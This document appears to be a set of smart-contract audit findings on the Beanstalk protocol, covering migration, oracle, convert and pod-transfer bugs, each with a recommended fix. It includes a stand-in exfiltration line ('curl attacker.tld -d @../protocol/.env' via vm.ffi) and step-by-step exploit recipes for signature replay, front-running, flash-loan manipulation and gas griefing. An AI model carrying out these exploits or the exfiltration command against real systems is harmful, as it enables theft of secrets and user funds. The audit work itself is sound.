findings.title: foundry.toml sets ffi = true with shell hooks (arbitrary build-time exec)
findings.description: protocol/foundry.toml line 33 sets `ffi = true` in [profile.default]. The Foundry FFI cheatcode lets any test or build helper invoke arbitrary shell commands on the build machine via `vm.ffi(...)`. The repository also ships executable shell scripts (.husky/pre-commit, post-commit, post-update, pre-push) and npm/yarn lifecycle scripts (root package.json `bootstrap`/`generate`/`build`, protocol package.json `generate`/`test`), so the host environment that runs the build already executes project-controlled scripts. Combined with broad `fs_permissions` granting read access to the entire parent directory (`{ access = "read", path = "../" }`), a compromised dependency or test helper that reaches an ffi call can read source/secrets and execute commands. Per the patient-zero threat model, the capability itself is the finding: a single tampered test or library file under contracts/test compiled with this profile can run shell commands during `forge test`/`forge build` on a developer or CI machine, before any auditor sees final bytecode. The [profile.audit] profile does NOT carry ffi, but the default profile (used for normal builds/tests) does.
findings.impact: A tampered dependency or test/build helper can execute arbitrary shell commands on developer/CI machines during `forge test` or `forge build` under the default profile, enabling secret exfiltration (the FORKING_RPC / ANVIL_FORK_URL secret, deployer keys in .env) or injection of code into build artifacts before review.
findings.proof_of_concept: Any Solidity file compiled under [profile.default] can call `string[] memory cmd = new string[](3); cmd[0] = "bash"; cmd[1] = "-c"; cmd[2] = "curl attacker.tld -d @../protocol/.env"; vm.ffi(cmd);`. Because ffi=true is set globally for the default profile, no per-test opt-in is required.
findings.recommendation: Set `ffi = false` in [profile.default]; only enable ffi in a dedicated, clearly named profile that is never the default and is used solely for the specific tests that require it. Tighten `fs_permissions` to the minimal directories actually needed instead of `../`. Document which tests legitimately require ffi and review them line by line.
findings.human_review_reason: Supply chain finding (SC-*). The ffi capability is unambiguous, but whether any shipped test/helper actually abuses it, and the operational risk of removing it, require human judgment about developer intent and CI configuration.

findings.title: Reseed leaves total Stalk/Roots and per-account Roots unset; Silo bricked
findings.description: The L2 reseed init facets re-issue every Farmer's deposits, plots, fertilizer and internal balances, but they NEVER initialize three core Silo aggregates that the entire Stalk/Roots accounting system depends on: the protocol-wide total Stalk (s.sys.silo.stalk, System.sol#94), the protocol-wide total Roots (s.sys.silo.roots, System.sol#95), and each account's Root balance (s.accts[account].roots, Account.sol#33). ReseedSilo.reseedSiloDeposit (ReseedSilo.sol#109-180) computes and writes only the per-account Stalk (line 164) and the per-token deposited/depositedBdv globals (lines 178-179). A grep across the entire init/ tree shows the only stalk/roots write is ReseedSilo.sol#164; s.sys.silo.stalk, s.sys.silo.roots and s.accts[].roots are written nowhere during reseed. After migration both totals and every account's roots are therefore zero while accounts hold non-zero stalk. This is a classic init-completeness / global-aggregate-left-zeroed storage bug introduced by the upgrade: the storage layout is correct but the migration fails to populate state that on-L1 was non-zero. The downstream LibSilo math then operates on an inconsistent state from block one of L2.
findings.impact: Beanstalk's Silo is the protocol's governance + yield core. With s.sys.silo.stalk == 0 and s.sys.silo.roots == 0 after reseed: (1) the first call into LibSilo.mintActiveStalk (LibSilo.sol#181) takes the roots==0 branch and re-bases roots from scratch (roots = stalk * C.getRootsBase()), so the new depositor's roots are computed against a total that excludes all migrated stalk, mispricing every subsequent root issuance; (2) balanceOfEarnedBeans / __calcEarnedBeans (LibSilo.sol#687-692) returns 0 for everyone because it early-returns on s.sys.silo.roots == 0, freezing all earned-Bean (yield) claims for migrated users; (3) because each migrated account has roots == 0 while holding stalk, LibSilo._removeAndUpdateRoots / withdraw / transferStalk paths (LibSilo.sol#244-307) compute roots = totalRoots*stalk/totalStalk which is 0/0 (division by zero -> revert once a non-zero total exists, or a 0 result that lets stalk be moved with no corresponding root debit), corrupting the stalk:root invariant that determines Bean-mint distribution and Flood/rain payouts. Net effect: migrated depositors cannot claim yield, root-weighted distributions (Flood/SOP, rain roots in LibFlood/LibGerminate) are mis-allocated, and the global Stalk supply used for governance weight reads as zero. This is direct, protocol-wide loss/freeze of user value arising from a one-time non-replayable init, hence Critical.
findings.recommendation: Add explicit initialization of the global aggregates and per-account Roots to the reseed. In reseedSiloDeposit accumulate a running total of issued stalk and set s.sys.silo.stalk to the L1 total; set s.sys.silo.roots to the L1 total Roots; and for each account set s.accts[account].roots to the migrated L1 Root balance (do not derive it from the empty post-migration totals). These must mirror the exact L1 snapshot values and be validated with require() against the migration input the same way totalDeposited is validated at lines 168-175.

ite.intent: Every migrated Beanstalk depositor loses access to earned-Bean yield and to correctly-weighted Flood/rain and governance accounting because the L2 Silo starts with zero total Stalk, zero total Roots, and zero per-account Roots while accounts hold non-zero Stalk.
ite.technique: ReseedSilo.init (ReseedSilo.sol#77) -> reseedSiloDeposit (line 109) writes only s.accts[].stalk (line 164) and per-token balances (lines 178-179). It never writes s.sys.silo.stalk (System.sol#94), s.sys.silo.roots (System.sol#95) or s.accts[].roots (Account.sol#33). Post-reseed, LibSilo.__calcEarnedBeans (LibSilo.sol#687) sees s.sys.silo.roots == 0 and returns 0 earned beans for all users; LibSilo.mintActiveStalk (line 183) takes the roots==0 path; and removeDeposited/transfer paths (lines 244,298) compute roots via totalRoots*stalk/totalStalk on a zero total, breaking the stalk:root ratio for all subsequent Silo operations.
ite.evasion: ReseedSilo validates per-token totalDeposited / totalDepositedBdv with require() (lines 168-175), giving the appearance of a fully-checked migration, but there is no analogous require() on total Stalk, total Roots or per-account Roots, so the missing aggregates pass undetected. The bug only manifests after the one-time reseed completes and the first Silo interaction occurs on L2.

findings.title: L2 migration redeem lacks nonce: signed redemption replayable to re-credit stalk
findings.description: L2ContractMigrationFacet.redeemDepositsAndInternalBalances() (L88) is a permissionless function: any operator may call it for any L1 `owner` whose (owner, deposits, internalBalances, ownerRoots) leaf is in the hardcoded MERKLE_ROOT, supplying the owner's L1 EIP-712 signature over (owner, receiver, deadline). Authorization is therefore (a) a valid merkle proof and (b) a valid owner signature. Neither the signature digest (REDEEM_DEPOSIT_TYPE_HASH over owner/receiver/deadline only, L45-48, L143-145) nor the function body contains any nonce or one-time `migrated[owner]` guard. After a successful redemption nothing is recorded that prevents re-execution. Because the credit step setStalk() (L205-211) accumulates with `+=` (s.accts[account].stalk += accountStalk; s.accts[account].roots += accountRoots;), the identical calldata (proof + signature + deposits) can be replayed an arbitrary number of times until `deadline`, each call adding another full copy of accountStalk and ownerRoots to the receiver. A grep of the entire active codebase confirms there is no `migrated` mapping or nonce store guarding this owner (only the type-hash string and the function itself reference the name). The operator chooses `receiver` only within the bounds the signature allows, but the owner — or an operator front-running/observing the owner's published signature within the live deadline window — can inflate the receiver's stalk (governance weight) and roots (yield share) far beyond the migrated position.

location.code_snippet: verifySignature(owner, reciever, deadline, signature); ... setStalk(reciever, accountStalk, ownerRoots);  // setStalk: s.accts[account].stalk += accountStalk; s.accts[account].roots += accountRoots; -- no nonce, no migrated flag

findings.impact: Stalk and roots (Beanstalk governance weight + yield/Earned-Bean share) can be minted to an attacker-chosen L2 receiver an unbounded number of times by replaying one valid migration signature+proof within the deadline window, breaking the conservation invariant between migrated L1 deposits and credited L2 stalk/roots and diluting all honest stalk holders.
findings.proof_of_concept: 1. Obtain (or observe on-chain) one valid owner signature + merkle proof for a redemption to receiver R (the owner legitimately publishes it, or it is captured from the mempool before its deadline). 2. Call redeemDepositsAndInternalBalances(owner, R, deposits, internalBalances, ownerRoots, proof, deadline, signature) — succeeds, crediting R with accountStalk/ownerRoots. 3. Call the EXACT same transaction again (and again) before `deadline`; verifySignature and verifyDepositsAndInternalBalances both pass identically because nothing was consumed; setStalk adds another full copy each time. Assert s.accts[R].stalk grows by accountStalk per replay.
findings.recommendation: Record a per-owner one-time consumption guard before crediting: e.g. require(!s.sys.migration.redeemed[owner]) then set it true inside redeemDepositsAndInternalBalances (or include and increment a nonce in REDEEM_DEPOSIT_TYPE_HASH). A single boolean `migrated[owner]` is sufficient since each owner redeems exactly once.

findings.title: LibChainlinkOracle.getTokenPrice inverts lookback: spot returned for TWAP
findings.description:
LibChainlinkOracle.getTokenPrice (contracts/libraries/Oracle/LibChainlinkOracle.sol#39-48) selects the price source with an INVERTED ternary:

    return lookback > 0
        ? getPrice(priceAggregatorAddress, maxTimeout)        // <-- instantaneous SPOT
        : getTwap(priceAggregatorAddress, maxTimeout, lookback); // <-- lookback==0 here

The semantics are backwards. The sibling oracle LibEthUsdOracle.getEthUsdPrice(lookback) (LibEthUsdOracle.sol#53-65) and the NatSpec everywhere in the codebase document the intended contract as: lookback > 0 => use the manipulation-resistant TWAP, lookback == 0 => use the instantaneous price. Here the two branches are swapped.

Consequences:
  (1) When a caller requests a TWAP (lookback > 0), getTokenPrice returns getPrice(...) — the single-round latestRoundData spot price — completely ignoring the requested averaging window. The manipulation-resistance the caller asked for is silently discarded.
  (2) When a caller requests the instantaneous price (lookback == 0), it calls getTwap(...,0). getTwap computes t.endTimestamp = block.timestamp - 0 = block.timestamp; the first `if (timestamp <= t.endTimestamp)` branch is taken (the latest round timestamp is <= now), so it returns the spot price via the early return and the final `.div(lookback)` (div-by-zero) is never reached. So the lookback==0 path happens to still return spot — but only by accident of the early return.

The net live bug is (1): every TWAP request through this function returns a non-time-averaged value. This function is the generic chainlink price path used by LibUsdOracle.getTokenPriceFromExternal for encodeType 0x01 tokens (LibUsdOracle.sol#120-127) and as the stablecoin leg of the uniswap+chainlink encodeType 0x02 path (LibUsdOracle.sol#155-160). ETH and WSTETH bypass getTokenPrice (LibUsdOracle.getUsdPrice/getTokenPrice branch on C.WETH / C.WSTETH and call LibEthUsdOracle/LibWstethUsdOracle directly, which use the CORRECT ternary), so the current BEAN:ETH / BEAN:wstETH wells are not affected. The exposure is any whitelisted Well whose non-Bean token resolves to the default chainlink implementation (encodeType 0x01), or any token whose USD value is fetched with a non-zero lookback for manipulation resistance.

location.code_snippet:
return
    lookback > 0
        ? getPrice(priceAggregatorAddress, maxTimeout)
        : getTwap(priceAggregatorAddress, maxTimeout, lookback);

findings.impact: For any whitelisted Well whose non-Bean token uses the default chainlink oracle (encodeType 0x01), the season minting oracle requests a TWAP (LibWellMinting.twaDeltaB -> LibWell.getRatiosAndBeanIndex(tokens, block.timestamp - season.timestamp) -> LibUsdOracle.getUsdPrice(token, lookback>0)) but receives the manipulable SPOT chainlink answer. The returned `ratios` feed calcReserveAtRatioSwap, which sets deltaB (LibWellMinting.sol#172-179) — the exact quantity of Beans minted in stepSun, and the soil/pod issuance derived from it. The same spot-for-twap substitution corrupts the LP-to-supply ratio (LibEvaluate.calcLPToSupplyRatio) and the excessive-price weather case (LibEvaluate.evalPrice). An attacker who skews the chainlink-priced token's spot feed (or sandwiches a thin feed update) at the season boundary biases the freshly minted supply distribution in their favour, defeating the TWA defense Beanstalk explicitly relies on.
findings.recommendation:
Swap the ternary branches so the function matches its documented and sibling-oracle semantics:

    return lookback > 0
        ? getTwap(priceAggregatorAddress, maxTimeout, lookback)
        : getPrice(priceAggregatorAddress, maxTimeout);

Add a regression test asserting that getTokenPrice(agg, timeout, 900) routes to getTwap and getTokenPrice(agg, timeout, 0) routes to getPrice. Consider reverting (rather than silently early-returning) inside getTwap when lookback == 0 to harden against future callers.

findings.title: Reseed order: ReseedSilo reads stalkIssuedPerBdv before ReseedWhitelist sets it
findings.description: The reseed pipeline runs facet init() calls in a fixed sequence (reseed/reseed.js): reseed5 -> ReseedSilo.init, reseed6 -> ReseedInternalBalances.init, reseed7 -> ReseedWhitelist.init. ReseedSilo.reseedSiloDeposit computes each migrated account's base Stalk from `stalkIssuedPerBdv` read out of `s.sys.silo.assetSettings[siloDeposit.token].stalkIssuedPerBdv` (ReseedSilo.sol#112), then `accountStalk += stalkIssuedPerBdv * totalBdvForAccount` (#161) and `s.accts[account].stalk = accountStalk` (#164). However, `assetSettings[token].stalkIssuedPerBdv` is ONLY ever populated by LibWhitelist.whitelistToken (LibWhitelist.sol#161), which is invoked by ReseedWhitelist.init — two pipeline steps AFTER ReseedSilo. At the time ReseedSilo runs, assetSettings is still zero-initialized, so `stalkIssuedPerBdv` reads 0 for every token. The base-stalk term collapses to 0, and because the per-deposit grown-stalk term is also ~0 at reseed (every deposit's stem equals the supplied stemTip, so `stemTip - stem == 0` at #132), each migrated holder is reseeded with effectively zero Stalk. This is a cross-step state-consistency / lifecycle-ordering defect: state written in a later reseed step (asset settings) is a precondition for a calculation performed in an earlier step. It is distinct from the sibling logic findings (LG-002 stalk overwrite via `=`, LG-003 missing roots/global totals): even if those were fixed, the value being assigned would still be ~0 because the multiplicand is read before it is initialized.

location.code_snippet:
uint256 stalkIssuedPerBdv = s.sys.silo.assetSettings[siloDeposit.token].stalkIssuedPerBdv; // reads 0 (ReseedWhitelist runs later)
...
accountStalk += stalkIssuedPerBdv * totalBdvForAccount; // == 0
s.accts[deposits.accounts].stalk = accountStalk; // account reseeded with ~0 stalk

findings.impact: Every migrated Silo depositor is initialized on L2 with effectively zero base Stalk (instead of bdv * stalkIssuedPerBdv, normally >= 1 Stalk per BDV). Stalk is Beanstalk's core governance weight and the basis for Earned-Bean (root) accrual; reseeding it to ~0 silently strips all migrated holders of the voting power and yield entitlement they held on L1, while their deposit amounts/BDV are preserved. Protocol-wide accounting (per-account Stalk vs global stalk/roots) is left permanently inconsistent at genesis of the new chain.
findings.proof_of_concept:
Pipeline order (reseed/reseed.js -> reseed5..reseed7):
  reseed5: ReseedSilo.init  -> reseedSiloDeposit reads assetSettings[token].stalkIssuedPerBdv == 0
  reseed7: ReseedWhitelist.init -> LibWhitelist.whitelistToken sets assetSettings[token].stalkIssuedPerBdv = X
For a holder with totalBdvForAccount = B and all deposits at stemTip:
  accountStalk = 0 (grown) + 0 (= 0 * B) = 0
  s.accts[holder].stalk = 0   // expected: X * B
After reseed7 sets stalkIssuedPerBdv, ReseedSilo is never re-run, so the stalk stays 0.
findings.recommendation: Reorder the reseed pipeline so ReseedWhitelist (assetSettings population) runs BEFORE ReseedSilo, or have ReseedSilo carry the per-token stalkIssuedPerBdv in its own calldata struct (like it already does for stemTip/totalDeposited) instead of reading it from assetSettings. Add a post-reseed invariant check asserting sum(account.stalk) reconciles with sum(bdv * stalkIssuedPerBdv) + grown stalk for each token. Also reset s.accts[account].lastUpdate to the reseed season during ReseedSilo so the first post-migration _mow does not treat migrated accounts as season-0 (currently left at default 0 against a large season.current).

findings.title: Unbounded plotIndexes growth bricks victim harvest/transfer (gas-griefing)
findings.description:
An attacker can permanently brick a victim's ability to harvest or transfer their Pods by inflating the victim's per-account plotIndexes array, then forcing every later harvest()/transferPlot() to perform an O(n) linear scan that exceeds the block gas limit.

Root cause: plot transfers are PUSH-style and require NO consent from the recipient. transferPlot(sender, recipient, fieldId, index, start, end) (MarketplaceFacet.sol#111) lets the caller (sender = attacker, or any sender that has approved the attacker) move Pods to an arbitrary recipient. _transferPlot (PodTransfer.sol#47) calls insertPlot (PodTransfer.sol#58) which does s.accts[to].fields[fieldId].plotIndexes.push(index) for the recipient. validatePlotAndReturnPods only requires the transferred range to be >= 1 pod (end > start, amount >= end), so an attacker can split one owned plot into thousands of 1-pod plots and push one plotIndexes entry into the victim's array per transfer. There is NO cap on plotIndexes.length anywhere in the codebase.

The corrupted array is consumed by LibDibbler.removePlotIndexFromAccount (LibDibbler.sol#388), which calls findPlotIndexForAccount (LibDibbler.sol#403). That function copies the ENTIRE plotIndexes array into memory (uint256[] memory plotIndexes = field.plotIndexes, one cold SLOAD ~2100 gas per element) and then runs a while-loop linear search for the target index. removePlotIndexFromAccount is invoked on the victim's own array every time the victim:
  - harvests a plot: FieldFacet.harvest -> _harvestPlot -> LibDibbler.removePlotIndexFromAccount (FieldFacet.sol#209), and
  - transfers/sells a full plot: PodTransfer.removePlot -> LibDibbler.removePlotIndexFromAccount (PodTransfer.sol#76).

Because the search cost scales with the total number of entries the attacker pushed (not with the victim's own plot count), and the worst-case target sits at the end of the array, a sufficiently large plotIndexes array makes the victim's harvest/transfer transaction revert with out-of-gas no matter how it is constructed. The victim cannot prune the array because pruning itself goes through the same removePlot path that runs out of gas.

Asymmetry: the attacker spreads the cost of pushing N entries across N cheap transactions (~one storage push each, batchable across many blocks via transferPlots), while the victim is forced to pay the full O(N) scan in a single transaction that must fit inside one block.
findings.impact: A griefing attacker can permanently deny a targeted Pod holder the ability to Harvest their Pods (claim Beans owed by the protocol once their Plots become Harvestable) and the ability to transfer or sell full Plots, by forcing every such transaction over the block gas limit. The victim's funds (Harvestable Beans) become effectively locked because the only redemption path (harvest -> _harvestPlot -> removePlotIndexFromAccount) reverts out-of-gas. No protocol-side recovery path exists; the bloated array can only be drained through the same reverting function.
findings.proof_of_concept:
Setup: attacker owns one Plot of P pods in fieldId 0 (acquired by sowing/buying), victim is any address.
Step 1 (repeatable, cheap): attacker calls transferPlot(attacker, victim, 0, index, start, start+1) splitting off a 1-pod sub-plot to the victim. Each call executes insertPlot(victim,...) -> plotIndexes.push (one new cold storage slot, ~22k gas). Using transferPlots(...) the attacker batches many such 1-pod splits per tx and repeats across many blocks. No victim consent is needed.
Step 2: attacker repeats until victim's plotIndexes.length is large (e.g. several thousand).
Step 3 (impact): victim attempts harvest(0, [theirPlot], mode). _harvestPlot -> LibDibbler.removePlotIndexFromAccount -> findPlotIndexForAccount copies the full plotIndexes array (cold SLOAD ~2100 gas/elt) and linear-scans it.
  Approx victim cost: ~2,100 gas/entry for the SLOAD copy alone.
    At  5,000 entries: ~10.5M gas (still lands on a 30M block but crowds out other ops)
    At 14,000 entries: ~29.4M gas (approaches the 30M block gas limit)
    At ~15,000+ entries: harvest()/transferPlot() for that field reverts out-of-gas for the victim in every block.
The attacker paid ~22k gas per entry spread over many txs/blocks; the victim must pay the entire scan in one tx -> permanent DoS of the victim's harvest and full-plot transfers in that field.

findings.title: Convert-capacity sandwich front-runs shared per-block cap, burns victim stalk
findings.description:
Beanstalk meters how much deltaB may be converted toward peg per block via a single shared accumulator, s.sys.convertCapacity[block.number].overallConvertCapacityUsed, capped at abs(LibDeltaB.overallCappedDeltaB()). Every Bean<->Well convert in the block adds the amount it moves toward peg into this accumulator (LibConvert.applyStalkPenalty L211-220, writing pdCapacity.overall computed in calculateConvertCapacityPenalty L309-311). Once the accumulator reaches the block's capped deltaB, calculateConvertCapacityPenalty (L297-306) returns a non-zero convertCapacityPenalty for any further toward-peg conversion, which feeds calculateStalkPenalty (L262-265) -> a positive stalkPenaltyBdv.

Two permissionless entry points consume the SAME accumulator and react to the penalty differently:
1. ConvertFacet.convert() (in-protocol Bean<->LP): LibPipelineConvert.checkForValidConvertAndUpdateConvertCapacity (L186-214) REQUIRES stalkPenaltyBdv == 0 and reverts otherwise.
2. PipelineConvertFacet.pipelineConvert(): LibPipelineConvert.executePipelineConvert does NOT revert on penalty; instead it BURNS grown stalk: newGrownStalk = initialGrownStalk * (fromBdv - stalkPenaltyBdv) / fromBdv (LibPipelineConvert.sol L72).

Because the accumulator is shared, an attacker can front-run a victim's convert with a cheap, penalty-free toward-peg convert sized to exhaust the block's overall (and/or per-well) convert capacity. The victim's transaction then lands with overallConvertCapacityUsed >= overallCappedDeltaB, so calculateConvertCapacityPenalty returns the victim's full towards-peg amount as a penalty. For a pipelineConvert victim this directly burns a pro-rata slice of the grown stalk attached to the deposits they are converting; the burned stalk is permanently lost yield (and roots/earned-bean entitlement). For an in-protocol convert victim it simply reverts, a per-block griefing/DoS on the convert function. The attacker's own toward-peg convert is by construction penalty-free (it runs while capacity is still available), so the attack is nearly costless to mount and can be repeated every block in which a victim convert is pending.
findings.impact: A victim performing a legitimate toward-peg pipelineConvert has a pro-rata portion of the grown stalk on their converted deposits burned (direct loss of accrued yield and root/earned-bean share); a victim using ConvertFacet.convert() is denied service (revert) for the remainder of the block. The attacker forces this for near-zero cost by consuming the block's shared convert capacity first.
findings.proof_of_concept:
1. Beanstalk is below peg (overallCappedDeltaB() = -X, so convert capacity for LP->Bean toward-peg = X). Victim broadcasts pipelineConvert moving V (V <= X) of toward-peg deltaB, carrying grown stalk G on the input deposits, expecting stalkPenaltyBdv = 0 and to keep all of G.
2. Attacker observes the mempool and front-runs with their own toward-peg convert (in-protocol convert() or pipelineConvert) of amount >= X, so overallConvertCapacityUsed becomes >= overallCappedDeltaB. Attacker's convert is penalty-free because capacity was still open when it ran.
3. Victim's tx executes: calculateConvertCapacityPenalty sees overallConvertCapacityUsed >= overallCappedDeltaB and returns cumulativePenalty = victim's full towards-peg amount; calculateStalkPenalty caps stalkPenaltyBdv at fromBdv.
4. executePipelineConvert burns the victim's grown stalk: newGrownStalk = G * (fromBdv - stalkPenaltyBdv)/fromBdv, which can be 0 when the whole convert is penalized. Net: attacker spent gas + a free convert, victim lost up to 100% of grown stalk G on the converted deposits. (If victim used convert(), step 3 reverts instead: griefing.)
findings.recommendation: Do not derive a user-facing penalty from a globally shared, front-runnable per-block accumulator without per-user fairness. Options: (a) compute each convert's penalty against the capacity remaining at the START of the user's own transaction snapshot rather than the running global total mutated by earlier txs in the block; (b) allow users to pass a maxStalkPenaltyBdv / minGrownStalkKept slippage bound that reverts the convert if exceeded, so a sandwiched pipelineConvert fails safe instead of silently burning stalk; (c) meter convert capacity per-account or with commit/reveal so capacity cannot be exhausted by an adversary in the same block.
findings.human_review_reason: Multi-actor, same-block ordering (MEV) economics: confirming realistic capacity sizes and that a profitable/cheap exhausting convert exists for the attacker requires modelling live deltaB and capped-reserve values. Trace of the penalty path is complete in-scope, but exploit economics need human/PoC validation.

ite.technique: Front-run with a penalty-free toward-peg convert sized to push s.sys.convertCapacity[block.number].overallConvertCapacityUsed >= overallCappedDeltaB (LibConvert.applyStalkPenalty L211-220). Victim's convert then gets a full convertCapacityPenalty (calculateConvertCapacityPenalty L297-306) -> stalkPenaltyBdv>0 -> executePipelineConvert burns grown stalk (LibPipelineConvert L72) or checkForValidConvert... reverts (L209-213).

The gap: capacity is one shared mutable accumulator with no per-user isolation and no user-supplied penalty/slippage bound, so an adversary can consume it before the victim's tx and the victim has no way to fail safe.

findings.title: Convert peg bound + stalk penalty use spot getReserves(), flash-exploitable
findings.description:
The Silo convert path (both `ConvertFacet.convert` and `PipelineConvertFacet.pipelineConvert`) determines (a) the maximum convertible amount and (b) the anti-peg stalk penalty entirely from the Well's *instantaneous* spot reserves, with no TWA / capped-reserve guard on either the convert direction or the convert amount.

Call chain:
- `LibConvert.getMaxAmountIn` -> `LibWellConvert.beansToPeg`/`lpToPeg` both read `IWell(well).getReserves()` (spot) at LibWellConvert.sol#39 / #60 and compute `calcReserveAtRatioLiquidity` to derive the maximum amount convertible 'to peg'. The USD ratio feeding this comes from `LibWell.getRatiosAndBeanIndex(tokens)` with lookback 0 (spot — see oracle OR-001/OR-002).
- The penalty calculation in `LibConvert.calculateStalkPenalty` derives before/after deltaB from `LibDeltaB.getCurrentDeltaB` -> `LibDeltaB.currentDeltaB` -> `IWell(well).getReserves()` with `ZERO_LOOKBACK` (LibDeltaB.sol#46-49). `calculateAgainstPeg`/`calculateTowardsPeg` (LibConvert.sol#369-430) therefore measure deltaB movement from spot.
- Only the *convert capacity* exemption (`overallCappedDeltaB`, `cappedReservesDeltaB`, LibDeltaB.sol#65-91) uses the pump's manipulation-resistant capped reserves. Capacity merely bounds how much penalty-free room exists per block; it does NOT bound the convert amount nor the spot-derived against-peg measurement.

Because everything that decides 'is this convert legal, how large can it be, and is it penalized' is spot-sourced, an attacker can flash-borrow WETH (or the non-Bean Well token), swap into the target Well to push spot deltaB strongly positive (well below peg appears as above peg, or the peg distance is inflated), then in the same transaction call `convert`/`pipelineConvert`. Effects: (1) `_beansToPeg`/`lpToPeg` returns an inflated cap (`require(maxBeans > 0)` / `require(maxLp > 0)` is satisfied even when the true TWA price is on the other side of peg), allowing a convert that should be disallowed or much smaller; (2) the spot before/after deltaB makes the attacker's against-peg movement read as zero, so `stalkPenaltyBdv == 0` — in pipelineConvert this means `newGrownStalk = initialGrownStalk * (fromBdv - 0)/fromBdv`, i.e. the attacker preserves 100% of grown stalk while actually moving the pool against peg. After the convert, the attacker unwinds the flash swap; the Well returns to its true price but the attacker keeps the over-sized / penalty-free converted deposit (LP minted via `IWell.sync` at the manipulated ratio at LibWellConvert.sol#186, or Beans extracted via `removeLiquidityOneToken` at #143).
findings.impact: An attacker holding Silo deposits can, in a single flash-loaned transaction, (a) convert a larger amount than the true peg distance permits and (b) dodge the grown-stalk convert penalty (`stalkPenaltyBdv` forced to 0). This lets them retain grown stalk / governance and yield weight they should have forfeited for an against-peg convert, and mint LP / extract Beans at a manipulated ratio — a direct value transfer from honest Stalk holders (dilution) and a degradation of the convert mechanism's peg-defense purpose.
findings.proof_of_concept:
1. EOA holds a Bean deposit with large grown stalk. True state: deltaB < 0 (below peg), so a Bean->LP convert should be disallowed (P must be >= 1) and an LP->Bean against-peg convert should incur a full stalk penalty.
2. Flash-borrow WETH; swap WETH->? in the BEAN:WETH Well to drive spot reserves so calcReserveAtRatio shows deltaB >= 0 (above peg). vm.load the Well reserves before/after to assert the spot deltaB sign flip.
3. Call ConvertFacet.convert (BEANS_TO_WELL_LP) — `_beansToPeg` now returns maxBeans > 0 (spot), the convert succeeds, and `checkForValidConvertAndUpdateConvertCapacity` computes before/after spot deltaB that read as towards-peg, so the require(stalkPenaltyBdv == 0) passes.
4. Assert: attacker's new LP deposit retains full grownStalk (no penalty) and BDV reflects the manipulated ratio.
5. Unwind the flash loan (swap back). Net: attacker paid only the round-trip swap fee/slippage but kept penalty-free grown stalk + an oversized convert.
findings.recommendation: Bound the convert direction and amount, and compute the stalk penalty's against/towards-peg measurement, from the pump's capped/TWA reserves (the same `cappedReservesDeltaB` / `readCappedReserves` already used for convert capacity), not from instantaneous `getReserves()`. At minimum, gate convert legality (`beansToPeg`/`lpToPeg`) on capped reserves so a single-block spot skew cannot open or enlarge a convert. Treat the USD ratio lookback consistently (do not pass lookback 0) — see OR-001/OR-002.

findings.title: ReseedField loop increments i instead of j, bricking field migration
findings.description: ReseedField.init() re-issues every L1 Plot to its owner on L2. The migration iterates accounts in an outer loop (index i) and that account's plots in an inner loop. The inner loop is written `for (uint j; j < accountPlots[i].plots.length; i++)` — the post-statement increments the OUTER index `i`, not the inner index `j`. Because `j` is never incremented, the inner-loop guard `j < accountPlots[i].plots.length` evaluates plot[0] repeatedly while `i` keeps advancing. For any account whose `plots` array is non-empty, `i` quickly exceeds `accountPlots.length` and `accountPlots[i]` reverts with an array out-of-bounds panic. The init step therefore always reverts (whenever at least one migrated plot exists), so the entire reseed diamondCut batch reverts and the Field can never be initialized. In the only edge case where it does NOT revert (the very first account has an empty plots array), the loop body simply never executes and that account's plots are silently dropped while the `calculatedTotalPods == totalPods` check would then fail. Either way the documented behavior — 're-issue plots to existing farmers, set Field to L1 state' — cannot be achieved. This is the classic wrong-loop-counter bug (cf. Solodit 'Incorrect logic in a while loop', High).
findings.impact: The one-time L1->L2 Field reseed always reverts for any non-empty plot set, so the diamondCut migration cannot complete and Field state (pods/harvestable/harvested/temperature) is never seeded. All Pod holders' debt positions fail to migrate; the protocol cannot launch on L2 with this init in the cut. In the degenerate non-reverting path, plots beyond plot[0] of the first account are silently dropped and the totalPods invariant check reverts. A bricked one-time migration of all Pod balances is a broken core invariant / loss-of-position class issue.

Guard re-checks j(=0) < accountPlots[1].plots.length -> accountPlots[1] is out of bounds (length 1) -> Panic(0x32) revert. The whole init reverts. Assert: vm.expectRevert() on init() with any single account holding >=1 plot. L2/L3: vm.load on s.sys.field.pods after the (reverted) cut == 0, proving Field never seeded.

findings.title: transferPlots swaps fieldId/amount args; pod allowance never consumed
findings.description:
The pod-transfer family is split into a single-plot entry (transferPlot) and a batch entry (transferPlots) on MarketplaceFacet. Both consume the spender's pod allowance via the same internal helper:

    function decrementAllowancePods(address owner, address spender, uint256 fieldId, uint256 amount) internal
        (PodTransfer.sol#89)

transferPlot (single) calls it with the correct argument order (MarketplaceFacet.sol#128):
    decrementAllowancePods(sender, LibTractor._user(), fieldId, transferAmount);

transferPlots (batch) calls it with fieldId and the amount TRANSPOSED (MarketplaceFacet.sol#163):
    decrementAllowancePods(sender, LibTractor._user(), totalAmount, fieldId);
                                                       ^^^^^^^^^^^  ^^^^^^^
                                                       (fieldId pos) (amount pos)

There is only one definition of decrementAllowancePods (no overload), so this compiles with totalAmount bound to the `fieldId` parameter and fieldId bound to the `amount` parameter. Inside the helper this means:
  - currentAllowance = allowancePods(owner, spender, totalAmount)  -> reads s.accts[owner].fields[totalAmount].podAllowances[spender], the WRONG field index (indexed by the pod amount, which is essentially never a real fieldId), so it is 0 in practice.
  - require(currentAllowance < amount) becomes require(0 < fieldId).
  - setAllowancePods(owner, spender, totalAmount, 0 - fieldId) writes to the wrong field slot.

The guard at MarketplaceFacet.sol#159-164 only runs for the delegated case (LibTractor._user() != sender, i.e. an approved spender moving the owner's plots) and only when the allowance is not unlimited. For the default/active Field (fieldId == 0, the production Beanstalk field per FieldFacet.activeField), the rewritten check is `0 < 0` which is false: no revert occurs, and the owner's REAL allowance in fields[0].podAllowances[spender] is never decremented. The spender's finite approval therefore behaves as an unlimited approval under the batch path. For a non-zero fieldId the same swap instead reverts (`0 < fieldId` true) for any finite allowance, bricking legitimate delegated batch transfers (secondary DoS).

This is an asymmetric/mis-scoped guard between sibling functions: the single-transfer guard correctly authorizes and consumes the allowance; the batch sibling reads and writes the wrong storage slot, so the authorization it appears to enforce is a no-op for the active field. Note also that in transferPlots the plots are moved by _transferPlots (MarketplaceFacet.sol#156) BEFORE this (broken) allowance check runs, so even the intended revert cannot un-move the plots.
